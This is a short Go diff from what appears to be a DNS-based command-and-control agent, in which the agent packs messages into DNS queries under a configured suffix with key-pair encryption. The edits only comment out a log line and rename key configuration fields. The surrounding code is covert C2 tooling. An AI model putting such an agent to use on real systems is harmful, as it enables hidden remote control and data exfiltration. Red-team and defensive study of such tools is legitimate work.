@@ -109,7 +109,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 				AgentStatus.NextMessageType = c2.MessageHealthcheck
 			}
 			payload := []byte("Ack!")
-			log.Infof("sending plyload %#v\n", msg)
+			// log.Infof("sending plyload %#v\n", msg)
 			// time.Sleep(2 * time.Second)
 			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
 			for _, Q := range Questions {
@@ -222,12 +222,12 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 		conf.GlobalAgentConfig.PrivateKey, err = cryptography.GenerateKey()
 		errorHandler(err)
 	} else {
-		conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyB32)
+		conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyBasexx)
 		errorHandler(err)
 	}
 
 	// extract the public key from the provided Base32 encoded string
-	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyB32)
+	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyBasexx)
 	errorHandler(err)
 
 	// start the agent by sending a healthcheck
